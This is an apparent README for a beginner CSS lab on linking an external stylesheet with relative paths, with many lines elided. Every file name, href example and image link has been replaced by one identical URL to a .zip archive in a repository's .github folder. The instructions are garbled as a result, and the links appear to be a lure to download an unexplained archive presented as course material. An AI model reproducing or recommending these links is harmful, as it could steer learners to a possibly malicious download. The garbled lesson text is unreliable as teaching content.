...
In this lab, we will be adding style to our `https://raw.githubusercontent.com/deerrickkorir/phase-0-css-fundamentals-lab/master/.github/css_lab_phase_fundamentals_1.3.zip` page by linking an
external CSS file. If you open `https://raw.githubusercontent.com/deerrickkorir/phase-0-css-fundamentals-lab/master/.github/css_lab_phase_fundamentals_1.3.zip` in the browser, you will see basic
...
`https://raw.githubusercontent.com/deerrickkorir/phase-0-css-fundamentals-lab/master/.github/css_lab_phase_fundamentals_1.3.zip` landing page).
...
should be written in `https://raw.githubusercontent.com/deerrickkorir/phase-0-css-fundamentals-lab/master/.github/css_lab_phase_fundamentals_1.3.zip`.
...
In `https://raw.githubusercontent.com/deerrickkorir/phase-0-css-fundamentals-lab/master/.github/css_lab_phase_fundamentals_1.3.zip`, provide a `<link>` tag which correctly sources the CSS file
...
Now, what is a relative path? You could write `href="https://raw.githubusercontent.com/deerrickkorir/phase-0-css-fundamentals-lab/master/.github/css_lab_phase_fundamentals_1.3.zip"` and the content
of `https://raw.githubusercontent.com/deerrickkorir/phase-0-css-fundamentals-lab/master/.github/css_lab_phase_fundamentals_1.3.zip` would change your `https://raw.githubusercontent.com/deerrickkorir/phase-0-css-fundamentals-lab/master/.github/css_lab_phase_fundamentals_1.3.zip` file. But we want to teach you to
...
use `link` to associate with a style sheet and we write `href="https://raw.githubusercontent.com/deerrickkorir/phase-0-css-fundamentals-lab/master/.github/css_lab_phase_fundamentals_1.3.zip"`
we're saying: "From the directory in which I, the `https://raw.githubusercontent.com/deerrickkorir/phase-0-css-fundamentals-lab/master/.github/css_lab_phase_fundamentals_1.3.zip` file live, look
for a file called `https://raw.githubusercontent.com/deerrickkorir/phase-0-css-fundamentals-lab/master/.github/css_lab_phase_fundamentals_1.3.zip` and use it." This pattern will help you and other
developers remove any possible confusion.

Hint: Try adding the following temporarily to your `https://raw.githubusercontent.com/deerrickkorir/phase-0-css-fundamentals-lab/master/.github/css_lab_phase_fundamentals_1.3.zip` file to test if
...
the `https://raw.githubusercontent.com/deerrickkorir/phase-0-css-fundamentals-lab/master/.github/css_lab_phase_fundamentals_1.3.zip`. Ultimately, the goal is to have your website look like the
...
In following the guidelines, you should be referencing the `https://raw.githubusercontent.com/deerrickkorir/phase-0-css-fundamentals-lab/master/.github/css_lab_phase_fundamentals_1.3.zip` to find
the appropriate tags/IDs that we will use as selectors in our `https://raw.githubusercontent.com/deerrickkorir/phase-0-css-fundamentals-lab/master/.github/css_lab_phase_fundamentals_1.3.zip` file.
...
![incomplete lab](https://raw.githubusercontent.com/deerrickkorir/phase-0-css-fundamentals-lab/master/.github/css_lab_phase_fundamentals_1.3.zip)

### What We Want

![complete lab](https://raw.githubusercontent.com/deerrickkorir/phase-0-css-fundamentals-lab/master/.github/css_lab_phase_fundamentals_1.3.zip)
...
[un-styled]:
  https://raw.githubusercontent.com/deerrickkorir/phase-0-css-fundamentals-lab/master/.github/css_lab_phase_fundamentals_1.3.zip
[styled]:
  https://raw.githubusercontent.com/deerrickkorir/phase-0-css-fundamentals-lab/master/.github/css_lab_phase_fundamentals_1.3.zip
